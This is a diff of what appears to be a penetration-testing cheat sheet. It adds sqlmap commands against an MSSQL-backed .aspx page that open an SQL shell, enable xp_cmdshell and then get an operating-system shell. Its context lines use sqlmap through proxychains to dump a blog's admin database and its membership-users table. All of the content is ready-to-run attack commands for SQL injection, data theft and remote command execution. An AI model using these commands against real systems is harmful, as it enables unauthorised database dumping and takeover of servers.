@@ -6,6 +6,16 @@ proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3
 proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db"
 proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db" -T “membership_users”
 
+# Enable xp_cmdshell
+sqlmap -u http://10.10.10.12/Visitas.aspx?IdEvento=%27 -D 'DB' --sql-shell --level 2 --risk 1
+sql-shell> SELECT * FROM sys.databases;
+sql-shell> EXECUTE sp_configure 'xp_cmdshell', 1; 
+sql-shell>  ...  OK
+
+# Execute xp_cmdshell
+sqlmap -u http://10.10.10.12/ModificarVisitas.aspx?IdEvento=%27 -D 'DB' --os-shell --level 2 --risk 1
+
+
 ==============================================================================
 [+] SQLmap with request
 ==============================================================================
